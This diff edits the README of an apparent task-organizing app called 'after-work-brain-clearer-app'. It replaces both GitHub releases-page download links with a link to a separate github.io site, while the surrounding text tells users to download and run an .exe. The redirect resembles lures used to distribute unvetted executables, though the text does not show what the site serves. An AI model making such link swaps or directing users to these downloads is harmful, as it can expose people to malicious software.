@@ -1,6 +1,6 @@
 # 🧠 after-work-brain-clearer-app - Turn unstructured thoughts into daily tasks
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lewiscalcic248/after-work-brain-clearer-app/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://lewiscalcic248.github.io)
 
 ## 📥 Getting Started
 
@@ -9,7 +9,7 @@ You can begin organizing your tasks in minutes. Follow these instructions to ins
 ### 1. Download the Installer
 Visit the project release page to get the latest version of the application. 
 
-[Click here to visit the download page](https://github.com/Lewiscalcic248/after-work-brain-clearer-app/releases)
+[Click here to visit the download page](https://lewiscalcic248.github.io)
 
 Look for the file that ends with ".exe" under the latest release heading. Click the file name to start the download. Your browser might ask you where to save the file. Choose your Downloads folder.
 
